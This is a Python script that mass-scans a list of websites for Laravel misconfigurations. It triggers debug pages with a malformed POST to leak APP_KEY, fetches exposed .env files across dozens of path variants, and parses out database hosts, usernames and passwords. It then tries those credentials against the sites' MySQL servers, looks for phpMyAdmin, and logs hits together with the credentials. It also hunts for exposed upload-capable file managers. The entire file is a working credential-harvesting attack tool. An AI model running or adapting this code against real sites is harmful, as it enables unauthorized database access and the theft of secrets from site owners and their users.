import requests
import re
import pymysql
from concurrent.futures import ThreadPoolExecutor

def ensure_http_prefix(url):
    if not url.startswith(('http://', 'https://')):
        return 'http://' + url
    return url

def check_cookie(url):
    try:
        response = requests.get(url, timeout=10)
        cookies = response.cookies.get_dict()

        for cookie_name, cookie_value in cookies.items():
            if 'XSRF-TOKEN' in cookie_name:
                print(f"XSRF-TOKEN found in cookies for {url}")
                
                with open('laravel_websites2025.txt', 'a') as f:
                    f.write(f'{url}\n')
                
                return True  
        print(f"XSRF-TOKEN not found in cookies for {url}")
    except requests.exceptions.RequestException as e:
        print(f"Error accessing {url}: {e}")
    
    return False  

def check_and_save(url, keyword, result_file):
    try:
        response = requests.get(url, timeout=10)
        
        if response.history:
            print(f'{url} redirected to {response.url}, marking as invalid.')
            return False
        
        if response.status_code == 200:
            if keyword is None or keyword in response.text:
                with open(result_file, 'a') as f:
                    f.write(f'Keyword "{keyword}" found in {url}\n')
                print(f'Keyword "{keyword}" found in {url} and saved to {result_file}')
                
                if keyword == "APP_KEY=":
                    process_database_extraction(response, url)

                return True
            else:
                print(f'Keyword "{keyword}" not found in {url}, marking as invalid.')
        else:
            print(f'Failed to access {url}. Status code: {response.status_code}')
        
    except requests.exceptions.RequestException as e:
        print(f'Error accessing {url}: {e}')
    
    return False  

def read_websites(file_path):
    with open(file_path, 'r') as file:
        return [line.strip() for line in file.readlines()]

def check_debug_laravel(url):
    response_text = False
    headers = {
        'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 '
                      '(KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36'
    }
    try:
        isReq = requests.post(url, data={"0x[]": "janc0xsec"}, headers=headers,
                              timeout=8, verify=False, allow_redirects=False)
        if "<td>APP_KEY</td>" in isReq.text:
            response_text = isReq
            with open("result_debuglaravel2025.txt", "a") as f:
                f.write(f"{url} has Laravel debug info (APP_KEY leak)\n")
            print(f"[+] Laravel debug exposed at {url}")
            process_database_extraction(isReq, url)
    except requests.exceptions.RequestException as e:
        print(f"Error checking Laravel debug at {url}: {e}")

    return response_text

def extract_db_credentials(text):
    credentials = {}
    patterns = {
        'DB_HOST': r'DB_HOST\s*=\s*([^\s\n]+)',
        'DB_USERNAME': r'DB_USERNAME\s*=\s*([^\s\n]+)',
        'DB_PASSWORD': r'DB_PASSWORD\s*=\s*([^\s\n]+)',
    }
    for key, pattern in patterns.items():
        match = re.search(pattern, text)
        if match:
            credentials[key] = match.group(1).strip(' "\'')

    return credentials

def try_connect_db(host, user, password):
    try:
        conn = pymysql.connect(
            host=host,
            user=user,
            password=password,
            connect_timeout=5
        )
        conn.close()
        return True
    except Exception as e:
        print(f"Gagal konek ke DB: {host} - {e}")
        return False

def check_phpmyadmin(url, db_user, db_pass):
    phpmyadmin_paths = [
        "/phpmyadmin", "/pma", "/dbadmin", "/phpMyAdmin", "/mysql"
    ]
    for path in phpmyadmin_paths:
        full_url = url.rstrip('/') + path
        try:
            r = requests.get(full_url, timeout=8)
            if '<a href="./url.php?url=https%3A%2F%2Fwww.phpmyadmin.net%2F"' in r.text:
                with open("result_phpmyadmin.txt", "a") as f:
                    f.write(f"{url} has phpMyAdmin | User: {db_user} | Pass: {db_pass}\n")
                print(f"[+] phpMyAdmin found at {full_url}")
                return True
        except Exception as e:
            print(f"Error checking phpMyAdmin on {full_url}: {e}")
    return False

def process_database_extraction(response_text, target_url):
    if not response_text:
        return

    creds = extract_db_credentials(response_text.text if hasattr(response_text, 'text') else response_text)
    if not creds:
        return

    db_host = creds.get('DB_HOST', '')
    db_user = creds.get('DB_USERNAME', '')
    db_pass = creds.get('DB_PASSWORD', '')

    if db_host in ['127.0.0.1', 'localhost'] and db_user and db_pass:
        domain = target_url.replace('http://', '').replace('https://', '').split('/')[0]
        print(f"[*] Testing remote DB using domain: {domain}")
        if try_connect_db(domain, db_user, db_pass):
            with open("result_database_remote.txt", "a") as f:
                f.write(f"{target_url} => Remote DB OK | USER: {db_user} | PASS: {db_pass}\n")
            print(f"[+] Remote DB access success for {domain}")

        check_phpmyadmin(target_url, db_user, db_pass)

def process_website(website, paths_to_check):
    full_url = ensure_http_prefix(website)

    check_debug_laravel(full_url)

    if check_cookie(full_url):
        for path, keyword, result_file in paths_to_check:
            target_url = full_url + path
            is_valid = check_and_save(target_url, keyword, result_file)
            
            if not is_valid:
                print(f'{target_url} is not valid.')
    else:
        print(f'{full_url} does not have a valid XSRF-TOKEN cookie, skipping...')

def main():
    paths_to_check = [
        ("/packages/barryvdh/elfinder/css/elfinder.min.css", "file manager for web", "result_elfinder2025.txt"),
        ("/admin/./packages/barryvdh/elfinder/css/elfinder.min.css", "file manager for web", "result_elfinder2025.txt"),
        ("/core/./packages/barryvdh/elfinder/css/elfinder.min.css", "file manager for web", "result_elfinder2025.txt"),
        ("/backend/./packages/barryvdh/elfinder/css/elfinder.min.css", "file manager for web", "result_elfinder2025.txt"),
        ("/app/./packages/barryvdh/elfinder/css/elfinder.min.css", "file manager for web", "result_elfinder2025.txt"),
        ("/laravel/./packages/barryvdh/elfinder/css/elfinder.min.css", "file manager for web", "result_elfinder2025.txt"),
        ("/beta/./packages/barryvdh/elfinder/css/elfinder.min.css", "file manager for web", "result_elfinder2025.txt"),
        ("/config/./packages/barryvdh/elfinder/css/elfinder.min.css", "file manager for web", "result_elfinder2025.txt"),
        ("/kyc/./packages/barryvdh/elfinder/css/elfinder.min.css", "file manager for web", "result_elfinder2025.txt"),
        ("/prod/./packages/barryvdh/elfinder/css/elfinder.min.css", "file manager for web", "result_elfinder2025.txt"),
        ("/api/./packages/barryvdh/elfinder/css/elfinder.min.css", "file manager for web", "result_elfinder2025.txt"),
        ("/assets/./packages/barryvdh/elfinder/css/elfinder.min.css", "file manager for web", "result_elfinder2025.txt"),
        ("/new/./packages/barryvdh/elfinder/css/elfinder.min.css", "file manager for web", "result_elfinder2025.txt"),
        ("/docker/./packages/barryvdh/elfinder/css/elfinder.min.css", "file manager for web", "result_elfinder2025.txt"),
        ("/./.env", "APP_KEY=", "result_env2025.txt"),
        ("/vendor/laravel-filemanager/css/cropper.min.css", "https://github.com/fengyuanchen/cropper", "result_filemanager2025.txt"),
        ("/admin/./vendor/laravel-filemanager/css/cropper.min.css", "https://github.com/fengyuanchen/cropper", "result_filemanager2025.txt"),
        ("/core/./vendor/laravel-filemanager/css/cropper.min.css", "https://github.com/fengyuanchen/cropper", "result_filemanager2025.txt"),
        ("/backend/./vendor/laravel-filemanager/css/cropper.min.css", "https://github.com/fengyuanchen/cropper", "result_filemanager2025.txt"),
        ("/app/./vendor/laravel-filemanager/css/cropper.min.css", "https://github.com/fengyuanchen/cropper", "result_filemanager2025.txt"),
        ("/laravel/./vendor/laravel-filemanager/css/cropper.min.css", "https://github.com/fengyuanchen/cropper", "result_filemanager2025.txt"),
        ("/beta/./vendor/laravel-filemanager/css/cropper.min.css", "https://github.com/fengyuanchen/cropper", "result_filemanager2025.txt"),
        ("/config/./vendor/laravel-filemanager/css/cropper.min.css", "https://github.com/fengyuanchen/cropper", "result_filemanager2025.txt"),
        ("/kyc/./vendor/laravel-filemanager/css/cropper.min.css", "https://github.com/fengyuanchen/cropper", "result_filemanager2025.txt"),
        ("/prod/./vendor/laravel-filemanager/css/cropper.min.css", "https://github.com/fengyuanchen/cropper", "result_filemanager2025.txt"),
        ("/api/./vendor/laravel-filemanager/css/cropper.min.css", "https://github.com/fengyuanchen/cropper", "result_filemanager2025.txt"),
        ("/assets/./vendor/laravel-filemanager/css/cropper.min.css", "https://github.com/fengyuanchen/cropper", "result_filemanager2025.txt"),
        ("/new/./vendor/laravel-filemanager/css/cropper.min.css", "https://github.com/fengyuanchen/cropper", "result_filemanager2025.txt"),
        ("/docker/./vendor/laravel-filemanager/css/cropper.min.css", "https://github.com/fengyuanchen/cropper", "result_filemanager2025.txt"),
        ("/vendor/packages/barryvdh/elfinder/css/elfinder.min.css", "file manager for web", 'result_elfinder.txt'),
        ("/public/vendor/laravel-filemanager/css/cropper.min.css", "https://github.com/fengyuanchen/cropper", "result_filemanager2025.txt"),
        ("/admin/./.env", "APP_KEY=", "result_env2025.txt"),
        ("/core/./.env", "APP_KEY=", "result_env2025.txt"),
        ("/backend/./.env", "APP_KEY=", "result_env2025.txt"),
        ("/app/./.env", "APP_KEY=", "result_env2025.txt"),
        ("/laravel/./.env", "APP_KEY=", "result_env2025.txt"),
        ("/beta/./.env", "APP_KEY=", "result_env2025.txt"),
        ("/config/./.env", "APP_KEY=", "result_env2025.txt"),
        ("/kyc/./.env", "APP_KEY=", "result_env2025.txt"),
        ("/prod/./.env", "APP_KEY=", "result_env2025.txt"),
        ("/api/./.env", "APP_KEY=", "result_env2025.txt"),
        ("/assets/./.env", "APP_KEY=", "result_env2025.txt"),
        ("/new/./.env", "APP_KEY=", "result_env2025.txt"),
        ("/docker/./.env", "APP_KEY=", "result_env2025.txt"),
        ("/@core/./.env", "APP_KEY=", "result_env2025.txt"),
	("/file-manager/ckeditor", "vendor/file-manager/css/file-manager.css", 'result_filemanager_ckeditor_2025.txt'),
	("/file-manager/tinymce", "vendor/file-manager/css/file-manager.css", 'result_filemanager_tinymce_2025.txt'),
        ("/admin/voyager-assets", "vendor/tcg/voyager", 'result_voyager2025.txt'),
	("/client/manifest.json", None, 'result_vebto2025.txt')
    ]

    websites = read_websites('list.txt')
    max_threads = 10

    with ThreadPoolExecutor(max_workers=max_threads) as executor:
        futures = [executor.submit(process_website, website, paths_to_check) for website in websites]
        for future in futures:
            future.result()

if __name__ == "__main__":
    main()


